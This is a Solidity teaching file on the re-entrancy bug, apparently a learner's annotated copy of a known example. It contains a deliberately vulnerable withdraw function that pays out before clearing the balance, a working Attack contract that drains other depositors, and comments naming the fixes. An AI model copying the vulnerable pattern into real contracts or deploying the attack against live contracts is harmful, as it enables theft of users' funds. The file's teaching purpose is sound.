// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

// Based on https://solidity-by-example.org/hacks/re-entrancy

/*
ReentrantVulnerable is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy ReentrantVulnerable
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into ReentrantVulnerable
3. Deploy Attack with address of ReentrantVulnerable
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call ReentrantVulnerable.withdraw multiple times before
ReentrantVulnerable.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- ReentrantVulnerable.deposit
- ReentrantVulnerable.withdraw
- Attack fallback (receives 1 Ether)
- ReentrantVulnerable.withdraw
- Attack.fallback (receives 1 Ether)
- ReentrantVulnerable.withdraw
- Attack fallback (receives 1 Ether)
*/

contract ReentrantVulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // There is actually a way, we can attack this fn and drain the balance.
    //the second way to prevent this is by using Mutex from openzeppelin --> bool locked,
    function withdraw() public payable {
        //require (!locked, "revert")
        //locked = true ---> once our code finished unlocke it
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}(""); // we always wana call any external contract as the last step in our fn
        require(sent, "Failed to send Ether");
        // the easy way to prevent this attack is to update our balance b4 we call the external contract
        balances[msg.sender] = 0;
        //locked = false
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    ReentrantVulnerable public reentrantVulnerable;

    constructor(address _reentrantVulnerableAddress) {
        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerableAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    //when withdraw() runs call data, we can ve it to trigger our fallback() to call withdraw() again, and again before it updates the balance
    //All we need t do is to deposit 1 eth and can be able to withdraw all the balance
    fallback() external payable {
        if (address(reentrantVulnerable).balance >= 1 ether) {
            reentrantVulnerable.withdraw();
        }
    }

    // This fn will call the withdraw in a malicious way
    function attack() external payable {
        require(msg.value >= 1 ether); //if there's any money left in the contract then withdraw
        reentrantVulnerable.deposit{value: 1 ether}();
        reentrantVulnerable.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
